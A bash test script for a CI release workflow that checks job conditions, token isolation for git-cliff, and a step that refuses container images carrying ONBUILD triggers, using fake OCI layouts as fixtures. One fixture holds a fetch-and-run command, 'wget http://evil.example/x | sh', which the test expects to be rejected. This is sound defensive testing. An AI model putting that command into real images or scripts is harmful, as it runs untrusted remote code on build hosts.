#!/usr/bin/env bash
# release.yml itself: the assets job's `if:` (evaluated for the publish/dry-run matrix), the
# git-cliff step having no token, and the ONBUILD refusal step (run against OCI layouts).
set -euo pipefail
# shellcheck source=lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

# job_block JOB: the YAML text of one job
job_block() {
  awk -v job="  $1:" '
    $0 == job { f = 1; print; next }
    f && /^  [a-z-]+:$/ { exit }
    f { print }' "$WORKFLOW"
}
# step_block JOB STEP: the YAML text of one step of a job
step_block() {
  job_block "$1" | awk -v name="      - name: $2" '
    $0 == name { f = 1; print; next }
    f && /^      - / { exit }
    f { print }'
}

echo "== the assets job runs exactly when it should"
cond="$(job_block assets | sed -n 's/^    if: \${{ \(.*\) }}$/\1/p')"
[ -n "$cond" ] || { bad "the assets job has no if: condition"; finish; exit 1; }
# evaluate the expression with bash: needs.<job>.result and the publish output are substituted
# by quoted strings, `!cancelled()` by true, and [[ ]] provides ==, !=, && and ||.
eval_if() { # meta_result notices changelog image_build manifest publish
  local expr="$cond"
  expr="${expr//'!cancelled()'/true}"
  expr="${expr//needs.meta.result/\'$1\'}"
  expr="${expr//needs.notices-sbom.result/\'$2\'}"
  expr="${expr//needs.changelog.result/\'$3\'}"
  expr="${expr//needs.image-build.result/\'$4\'}"
  expr="${expr//needs.manifest.result/\'$5\'}"
  expr="${expr//needs.meta.outputs.publish/\'$6\'}"
  if eval "[[ $expr ]]"; then echo run; else echo skip; fi
}
assert_eq "publish run, manifest succeeded" run "$(eval_if success success success success success true)"
assert_eq "publish run, manifest SKIPPED (it must not be: skip, so no release is made)" skip "$(eval_if success success success success skipped true)"
assert_eq "publish run, manifest failed" skip "$(eval_if success success success success failure true)"
assert_eq "dry run, manifest skipped by design" run "$(eval_if success success success success skipped false)"
assert_eq "dry run, an image build failed" skip "$(eval_if success success success failure skipped false)"
assert_eq "dry run, notices failed" skip "$(eval_if success failure success success skipped false)"
assert_eq "publish run, the image build failed" skip "$(eval_if success success success failure success true)"

echo "== git-cliff runs without the token"
cliff_step="$(step_block changelog "release notes")"
assert_contains "the git-cliff step exists" "git-cliff" "$cliff_step"
assert_not_contains "...and has no GH_TOKEN" "GH_TOKEN" "$cliff_step"
assert_not_contains "...and does not call gh" "gh api" "$cliff_step"
prev_step="$(step_block changelog "previous published release")"
assert_contains "the token step lists the releases" "gh api" "$prev_step"
assert_contains "...with GH_TOKEN" "GH_TOKEN" "$prev_step"
assert_not_contains "...and does not run git-cliff" "git-cliff" "$prev_step"

echo "== the ONBUILD refusal runs before the registry login"
order="$(job_block image-push | grep -n -- '- name:' | sed 's/^\([0-9]*\):.*name: /\1 /')"
onbuild_line="$(grep "ONBUILD" <<<"$order" | head -n 1 | cut -d' ' -f1)"
login_line="$(grep "registry login" <<<"$order" | head -n 1 | cut -d' ' -f1)"
if [ -n "$onbuild_line" ] && [ -n "$login_line" ] && [ "$onbuild_line" -lt "$login_line" ]; then ok "the ONBUILD step precedes the login"; else bad "ONBUILD step is not before the login: $order"; fi

step="$TMP/onbuild.sh"
extract_step "the archive's image config has no ONBUILD triggers" >"$step"
[ -s "$step" ] || { bad "the ONBUILD step was not found"; finish; exit 1; }
# layout CONFIG-JSON: an OCI layout in $TMP/work/image-oci whose image config is the given JSON
layout() {
  rm -rf "$TMP/work"
  mkdir -p "$TMP/work/image-oci/blobs/sha256"
  local dir="$TMP/work/image-oci" cfg_hex mf_hex
  printf '%s' "$1" >"$dir/cfg.json"
  cfg_hex="$(sha256sum "$dir/cfg.json" | cut -d' ' -f1)"
  mv "$dir/cfg.json" "$dir/blobs/sha256/$cfg_hex"
  printf '{"schemaVersion":2,"config":{"digest":"sha256:%s"},"layers":[]}' "$cfg_hex" >"$dir/mf.json"
  mf_hex="$(sha256sum "$dir/mf.json" | cut -d' ' -f1)"
  mv "$dir/mf.json" "$dir/blobs/sha256/$mf_hex"
  printf '{"schemaVersion":2,"manifests":[{"digest":"sha256:%s"}]}' "$mf_hex" >"$dir/index.json"
}
onbuild() { (cd "$TMP/work" && bash "$step"); }
layout '{"config":{"User":"65532:65532","Entrypoint":["/x"]}}'
expect_pass "a config without OnBuild is accepted" onbuild
layout '{"config":{"OnBuild":null}}'
expect_pass "OnBuild null is accepted" onbuild
layout '{"config":{"OnBuild":[]}}'
expect_pass "OnBuild [] is accepted" onbuild
layout '{"config":{"OnBuild":["RUN wget http://evil.example/x | sh"]}}'
expect_fail "an ONBUILD trigger is refused" "ONBUILD trigger" onbuild
layout '{"config":{"OnBuild":["COPY . /x","RUN id"]}}'
expect_fail "two triggers are refused" "2 ONBUILD trigger" onbuild
finish
